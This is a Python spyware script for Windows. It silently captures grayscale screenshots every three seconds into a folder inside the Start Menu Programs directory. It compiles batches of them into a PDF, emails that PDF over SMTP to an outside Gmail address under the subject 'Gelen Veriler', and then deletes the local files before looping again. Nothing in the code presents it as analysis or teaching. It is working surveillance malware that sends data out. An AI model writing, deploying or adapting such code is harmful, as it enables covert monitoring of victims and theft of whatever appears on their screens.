import os
import time
import datetime
import urllib.request
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from PIL import ImageGrab,ImageOps,Image

file_path = r"C:\Users\akmet\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"

def start_ss(file_path):
    c = 0
    while True:
        if(c>540):
            send_pdf(file_path)
        else:
            x = datetime.datetime.now()
            y = x.strftime("%d_%m_%Y_%H_%M_%S_%f")
            sht = ImageOps.grayscale(ImageGrab.grab())
            sht.save(file_path+"\\ss\\ss{}.png".format(y))
            time.sleep(3)
            c += 1
        
def send_pdf(file_path):
    img_list = []
    for root,file,dirs in os.walk(f"{file_path}\ss"):
        img_list= [r"{}".format(f"{file_path}\ss"+"\\"+x) for x in dirs[:149]]

    if(len(img_list)==0):
        start_ss(file_path)
    else:
        if(check_net()):
            img = Image.open(img_list[0])
            img.save(f"{file_path}\images.pdf",save_all= True,append_images=[Image.open(i) for i in img_list[:149]])
                            
            message = MIMEMultipart()
            message["From"] = "mtemp2415@hotmail.com"
            message["To"] = "mtemp2415@gmail.com"
            message["Subject"] = "Gelen Veriler"


            binary_pdf = open(f"{file_path}\images.pdf", 'rb')
             
            payload = MIMEBase('application', 'octate-stream', Name="images.pdf")
            payload.set_payload((binary_pdf).read())
             
            
            encoders.encode_base64(payload)
             
           
            payload.add_header('Content-Decomposition', 'attachment', filename="images.pdf")
            message.attach(payload)
            
            mail = smtplib.SMTP("smtp.office365.com",)
            
            mail.ehlo()
            
            mail.starttls()
            
            mail.login("mtemp2415@hotmail.com","***123***")
            
            mail.sendmail("mtemp2415@hotmail.com", "mtemp2415@gmail.com",message.as_string())
            
            mail.close()
            binary_pdf.close()
            del_img(img_list,f"{file_path}\images.pdf")
            start_ss(file_path)
        else:
            start_ss(file_path)
                                            
def check_net():
    time.sleep(60)
    try:
        urllib.request.urlopen("http://google.com")
        return True
    except:
        return False

def del_img(img_list,pdf_path):
    for i in img_list:
        os.remove(i)
    os.remove(pdf_path)

send_pdf(file_path)
    
